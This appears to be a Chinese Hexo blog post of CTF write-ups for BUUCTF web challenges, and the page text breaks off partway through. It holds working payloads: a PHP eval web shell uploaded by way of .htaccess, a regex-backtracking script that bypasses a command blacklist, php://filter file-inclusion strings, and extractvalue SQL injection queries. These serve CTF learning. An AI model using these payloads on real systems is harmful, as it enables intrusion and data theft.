@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="[GXYCTF2019]BabyUpload知识点  mime头绕过 .htaccess文件上传，图片马解析为php   进去就是直接了当的上传页面，尝试上传文件，提示上传类型太露骨。上传照片，不行。这里有个坑，就是你上传的时候mime头改为image&#x2F;jpeg是可以过的，但是直接上传jpg图片不行，估计是size的问题。试了一遍各种mime头，好像只有image&#x2F;jpe能过。尝试上传php文件，">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-wp3">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;11&#x2F;buuctf-wp3&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="[GXYCTF2019]BabyUpload知识点  mime头绕过 .htaccess文件上传，图片马解析为php   进去就是直接了当的上传页面，尝试上传文件，提示上传类型太露骨。上传照片，不行。这里有个坑，就是你上传的时候mime头改为image&#x2F;jpeg是可以过的，但是直接上传jpg图片不行，估计是size的问题。试了一遍各种mime头，好像只有image&#x2F;jpe能过。尝试上传php文件，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;11&#x2F;FIUCjBtih4Eedqw.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;22&#x2F;eGl4QH7OaqrNJ9i.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;23&#x2F;7a9xiPWZOnNd2Yv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;23&#x2F;H674RwmyNehWAbX.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;23&#x2F;lAfVSBHbUjQCWq5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;23&#x2F;ExDnHGbdciOBT5J.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;UAJL4yvYQoM8pF3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;vdH7PUxCqpDa6iA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;ezDQi8S52A1nPVK.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;PwDdKL1lGrh4juk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;ci9VoKX17FnQBxE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;H2ZFY1b9i6KUQPN.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;YAWcl9kmpE15abK.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;vTf9CUNPmjHMEiu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;zVJUfitX2CyA5qh.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;24&#x2F;oMqZ4lJw2LDGbWa.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;28&#x2F;uXIn3gkYjDJlCN8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;28&#x2F;Qlnhu1qUAVKBpoE.png">
+<meta property="og:updated_time" content="2020-06-09T03:57:01.350Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;04&#x2F;11&#x2F;FIUCjBtih4Eedqw.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/11/buuctf-wp3/"/>
+
+
+
+
+
+  <title>buuctf-wp3 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/11/buuctf-wp3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buuctf-wp3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-11T00:24:56+08:00">
+                2020-04-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  13.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  59
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>知识点</p>
+<ul>
+<li>mime头绕过</li>
+<li>.htaccess文件上传，图片马解析为php</li>
+</ul>
+<hr>
+<p>进去就是直接了当的上传页面，尝试上传文件，提示上传类型太露骨。<br>上传照片，不行。这里有个坑，就是你上传的时候mime头改为image/jpeg是可以过的，但是直接上传jpg图片不行，估计是size的问题。<br>试了一遍各种mime头，好像只有image/jpe能过。<br>尝试上传php文件，提示不能上传带ph后缀的。<br>通过访问不存在的文件得知后端服务器为apache，所以上传一个.htaccess文件，内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>这样就会把所有文件当成php解析。<br>随后上传一个jpg文件内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;123&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>就getshell了。<br>这里不能用.user.ini来解题，因为即使能上传.user.ini并且成功包含到上传的图片马也是不行的，<br>因为要访问到同一目录下的php文件才行，而这里又不能上传后缀带ph的文件，所以此路应该不通。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这道题难度应该不算大，有点坑人的地方应该就在mime头这里，上传一个jpg图片不行让我一度以为image/jpeg不行。<br>最后实在不死心找了mime头一个个从头试才发现能过。</p>
+<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>知识点</p>
+<ul>
+<li>正则回溯绕过preg_match过滤<br>这个正则回溯的问题其实在hackergame2019也有过类似题目，当时也是利用正则回溯解题<br>现在附上p牛的一篇文章作为参考<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">正则回溯绕过preg_match</a><br>看了这篇文章一举搞懂NFA如何匹配还有非贪婪匹配的匹配机制。当然，既然看懂了非贪婪，而正则默认是贪婪匹配的，当然也看懂了。非常感谢。</li>
+</ul>
+<hr>
+<p>题目复现好像和当时原题略有不同，尝试了一番完全没能解题，只好看wp。<br>大家好像都有源码来着，这里不知道什么原因但是确实没能拿到源码(原题好像不给扫描或者爆破)<br>既然看了wp就把源码也贴在这里了<a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">先知wp</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>p牛的文章里有写出，回溯次数应该是100万次，有了NFA回溯工作的理解，构造payload应该是不成问题的。<br>比如这题的payload可以这么写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = &apos;a&apos;*1000000</span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;ls /&quot;,&quot;bg&quot;:&apos; &apos;&quot;&apos; + s + &apos;&quot;&#125;&apos;</span><br><span class="line"># print(payload)</span><br><span class="line">res = requests.post(&apos;http://ab4bcd42-54ae-43ea-87e8-0ac020315a63.node3.buuoj.cn/&apos;,data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">这样打上去的话，在preg_match的时候，.*会全部匹配完，但是还不符合整个匹配表达式，于是尝试回溯，不断吐出a，直到超过最大次数限制(为了防止ddos)</span><br><span class="line">最后返回了false(preg_match函数返回false表示此次执行失败了。原本应该返回1或者0，表示匹配次数)，于是绕过了本题的匹配.</span><br><span class="line">而之所以要构造两个键主要是为了在json_deconde处不出错，第二个键叫啥没关系，只要后面的一百万个字符不要提前匹配到黑名单里面的命令就不会停止回溯。</span><br></pre></td></tr></table></figure>
+<p>这样之后虽然可以绕过过滤执行ls /，但是尝试cat index.php的时候还是没反应.看了wp应该是putenv一句的问题，把PATH系统路径改了，直接cat会找不到二进制文件了<br>(原本的PATH应该是/bin/ 之类的)，而现在应该只包含ls这个可执行的二进制文件。<br>我本机的$PATH是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@irrik:/bin# $PATH</span><br><span class="line">bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin: No such file or directory</span><br></pre></td></tr></table></figure>
+<p>那么不能cat之类的也破案了。<br>虽然不能直接cat，但是我们还可以直接用绝对路径调用命令。(在/bin /usr/bin 下有普通用户可用的命令，而/sbin /usr/sbin 下是root用户才可用的命令)<br>于是我们可以这样来调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;ls /&quot;,&quot;bg&quot;:&apos; &apos;&quot;&apos; + s + &apos;&quot;&#125;&apos;</span><br><span class="line">但是这里我尝试了用/bin/find / -name flag没找到flag</span><br><span class="line">于是在自己的虚拟机里试了一下</span><br><span class="line">find / -name find</span><br><span class="line">发现find命令是在/usr/bin目录下的，所以可以这么用</span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag&quot;,&quot;bg&quot;:&apos; &apos;&quot;&apos; + s + &apos;&quot;&#125;&apos;</span><br><span class="line">成功找到flag，/home/rceservice/flag</span><br><span class="line">最后</span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;bg&quot;:&apos; &apos;&quot;&apos; + s + &apos;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p>值得注意的是，本题的cat命令存放在/bin/cat下，而我本机的cat是存放在/usr/bin/cat下的<br>应该是不同操作系统存放位置有所差异，但是总是跑不出那几个PATH的路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin </span><br><span class="line">/sbin</span><br><span class="line">/usr/bin </span><br><span class="line">/usr/sbin </span><br><span class="line">/usr/local/sbin </span><br><span class="line">/usr/local/bin</span><br></pre></td></tr></table></figure>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>这道题对我而言真是获益良多，不仅学到了NFA,对正则的匹配过程理解也是更上一层楼，<br>而且对linux的命令使用也是更加熟悉了，之前一直以为find命令在/bin下。<br>遇到本题之后手动实践发现不然。<br>而且本题的$PATH改动，也让我联想到了windows的Path环境变量，于是看了看$PATH的内容，<br>也是有所收获。总而言之，非常感谢。</p>
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>知识点</p>
+<ul>
+<li>php://filter</li>
+<li>文件包含</li>
+</ul>
+<hr>
+<p>进去随便点个按钮，发现参数变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=woofers</span><br></pre></td></tr></table></figure>
+<p>敏感的加个单引号，发现报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(woofers&apos;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &apos;woofers&apos;.php&apos; for inclusion (include_path=&apos;.:/usr/local/lib/php&apos;) in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure>
+<p>发现在我们参数的基础上加了.php后缀指定。<br>这里附一篇文件包含参考文<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">php文件包含</a><br>这里不仅总结了各种包含的姿势，而且提供了一众的绕过姿势，可以说是非常棒了。<br>像这题我本来都忘记了文件包含的时候用一个php://filter读源码，看了这篇文才记起来(好迟钝！！)<br>直接尝试访问<a href="http://domain/flag.php" target="_blank" rel="noopener">http://domain/flag.php</a><br>没报错，至少说明有这个文件.而且注释里有个提示，提示我们想办法读这个flag.php</p>
+<hr>
+<p>回到刚才的问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=woofers</span><br></pre></td></tr></table></figure>
+<p>尝试用如下payload读源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=woofers</span><br></pre></td></tr></table></figure>
+<p>拼接上.php之后就能成功读到源码。woofers和另一个猫咪的源码没啥用，这里就不说了<br>接下来改一下payload读index.php的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $file = $_GET[&apos;category&apos;];</span><br><span class="line"></span><br><span class="line">  if(isset($file))</span><br><span class="line">  &#123;</span><br><span class="line">    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">      include ($file . &apos;.php&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的要求是参数值里必须有woofers或者meowers或者index。但是我们的目标是读取flag.php。一时间就失去了思路。最后看wp。<br>发现php://filter是可以用多个过滤器名称的<br><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">参考</a><br><img src="https://i.loli.net/2020/04/11/FIUCjBtih4Eedqw.png" alt="Snipaste_2020-04-11_19-02-55.png"><br>官方提供的手册还提到，resource必须位于php://filter的末尾。<br>最后用如下payload就能读到flag了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode|index/resource=flag</span><br></pre></td></tr></table></figure>
+<p>而且，做题的时候，发现这个payload，会无限递归包含，把服务器打炸</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../var/www/html/index</span><br></pre></td></tr></table></figure>
+<p>但是直接index居然不行，这里不知道是不是有什么玄妙之0day呢？</p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>好像总结出来ctf的一点套路了，有些平时没咋用到的知识，翻翻文档就能题解。。<br>好像也不是一次两次了。不过这次学习还是有所收获的，除了解题用到的知识点，<br>还有那位大佬总结的文件包含漏洞文章，真的很值得一看。</p>
+<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>知识点</p>
+<ul>
+<li>二次注入</li>
+<li>reverse逆序输出字符串</li>
+<li>使用regexp匹配完整flag，使用!=筛选数据</li>
+</ul>
+<hr>
+<p>进去提示登录，注册登录发现用户名回显。之前做过类似题目有可能有二次注入。<br>注册了个irrik’，点了一圈没发现什么东西。<br>尝试xss，发现&lt;&gt;被过滤了。<br>尝试ssti，无果。</p>
+<hr>
+<p>看wp。果然还是二次注入，但是这次触发二次注入的条件居然是”。<br><a href="https://www.cnblogs.com/gaonuoqi/p/12621382.html" target="_blank" rel="noopener">参考wp</a><br>这个推测后端数据是最厉害的(我没猜到)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&apos;xxxx&apos; where username=&quot;xxxx&quot; and pwd=&apos;202cb962ac59075b964b07152d234b70&apos;</span><br></pre></td></tr></table></figure>
+<p>知道了这里接下来就可以自己写payload了。这里过滤了一些字符串操纵函数,比如mid,substr,substring,left,right.但是还剩下一个reverse函数可用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">拿表名，有个假的flag表，users表</span><br><span class="line">irrik&quot;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=(database())),0x7e)))#</span><br><span class="line">flag在users表里面，直接爆字段</span><br><span class="line">irrik&quot;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&apos;users&apos;),0x7e)))#</span><br><span class="line">查数据，有干扰数据xxx,xxx,。可以用where(real_flag_1s_here)!=(&apos;xxx&apos;),来匹配flag。匹配到的flag为flag&#123;xxx&#125;格式</span><br><span class="line">于是用where(real_flag_1s_here)regexp(&apos;^flag&apos;)来匹配flag也行</span><br><span class="line">irrik&quot;or(extractvalue(1,concat(0x7e,(reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&apos;^flag&apos;)))),0x7e)))#</span><br></pre></td></tr></table></figure>
+<p>把逆序输出的flag用python的切片再逆转一遍然后拼接起来就行了。</p>
+<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>这道题又学到了点新东西，reverse，regexp。还有二次注入居然还能用双引号触发这么玩，完美躲过我第一波探测。</p>
+<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>知识点</p>
+<ul>
+<li>js混淆</li>
+<li>preg_match绕过</li>
+<li>data伪协议</li>
+</ul>
+<hr>
+<p>进去随便看看注释，发现如下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[&apos;QUERY_STRING&apos;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &apos;_&apos;) !== 0 || substr_count($query, &apos;%5f&apos;) != 0 )&#123;</span><br><span class="line">    die(&apos;Y0u are So cutE!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&apos;b_u_p_t&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;b_u_p_t&apos;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里就是想办法绕过preg_match了，但是有一个问题是查询字符串里不允许有_。<br>这里可以用.来绕过，比如?a.b=xx，会转换为a_b。<br>随后是preg_match的绕过，这里没有用回溯限制的点，但是可以利用preg_match只匹配第一行的特点来绕过。<br>用<code>23333%0a</code>绕过即可。<br>随后提示内容在secrettw.php里。访问一下。发现注释里有js混淆的内容，直接复制到console运行，提示我们要Post一个Merak。<br>之后得到源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 